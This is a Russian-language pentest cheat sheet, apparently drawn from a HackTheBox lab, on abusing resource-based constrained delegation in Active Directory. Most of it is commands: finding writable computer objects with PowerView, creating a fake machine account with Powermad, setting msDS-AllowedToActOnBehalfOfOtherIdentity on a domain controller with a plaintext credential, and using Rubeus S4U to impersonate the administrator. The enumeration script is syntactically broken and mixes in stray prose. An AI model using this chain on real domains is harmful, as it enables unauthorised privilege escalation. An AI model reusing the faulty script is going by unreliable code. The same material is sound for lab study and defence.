#AD #attacks #windows #linux #delegation #rbcd 

> Этот тип делегирования позволяет настраивать параметры делегирования для целевой службы, а не для учетной записи службы, используемой для доступа к ресурсам.

RBCD использует дескрипторы безопасности вместо разрешенного списка имен участников-служб. Администратор определяет, какие субъекты безопасности могут запрашивать билеты Kerberos для пользователя. Когда служба получает запрос на предоставление доступа от имени другого пользователя, KDC сверяет его с дескрипторами безопасности в атрибуте `msDS-AllowedToActOnBehalfOfOtherIdentity` субъекта, запускающего серверную службу

![[Resoursed-Based Constrained Delegations.png]]

### Для проведения атак на RBCD нам нужны два элемента:

1) Доступ к пользователю или группе, которые имеют права изменять msDS-AllowedToActOnBehalfOfOtherIdentity свойство на компьютере. Обычно это возможно, если пользователь имеет ***GenericWrite, GenericAll, WriteProperty или WriteDACL*** привилегии на компьютерном объекте.
2) Управление другим объектом, у которого есть SPN.

#### 1) Скрипт для поиска RBCD
```powershell
Import-Module C:\Tools\PowerView.ps1  
$computers = Get-DomainComputer  
$users = Get-DomainUser   
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl" 
foreach computer in the domain foreach ($computer in $computers) {     
	$acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs        
	foreach ($user in $users) {               
		$hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | {($_.ActiveDirectoryRights -match ($accessRights -join '|'))}          
		if ($hasAccess) {             
			Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"         
		}     
	} 
}
# <user> has the required access rights on <DC>
```
У нас уже есть пользователь `user` с правами на `DC01`. Самый простой способ получить объект с SPN — использовать компьютер.

#### 2) Использование PowerMad для создания поддельного компьютера
```powershell
Import-Module .\Powermad.ps1 
New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
```

Затем мы добавляем эту учетную запись компьютера в список доверенных на целевом компьютере, что возможно, поскольку у злоумышленника есть `GenericAll ACL` на этом компьютере:

1. Получить идентификатор безопасности компьютера.
2. Используйте язык определения дескрипторов безопасности (Security Descriptor Definition Language, SDDL) для создания дескриптора безопасности.
3. Установите `msDS-AllowedToActOnBehalfOfOtherIdentity` в необработанном двоичном формате.
4. Измените целевой компьютер.
#### 3) Измените целевой компьютер
```powershell
Import-Module .\PowerView.ps1 

$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid 

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 

$SDBytes = New-Object byte[] ($SD.BinaryLength) 

$SD.GetBinaryForm($SDBytes, 0) 

$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force) 

Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```

#### 4) Получение хэша учетки из пароля
```powershell
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
```

Теперь мы можем запросить TGT для созданной учетной записи компьютера, затем `S4U2Self` запросить пересылаемый билет TGS, а затем `S4U2Proxy` получить действительный билет TGS для конкретного имени участника-службы на целевом компьютере
#### 5) Выдаем себя за админа
```powershell
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
```

>Примечание: Мы также можем использовать *<u>/altservice:host,RPCSS,wsman,http,ldap,krbtgt,ldap</u>* для добавления дополнительных услуг в наш запрос на билет. 

### ! 6) После работы удалить атрибут
```powershell
Import-Module .\PowerView.ps1 

$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force) 

Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
```
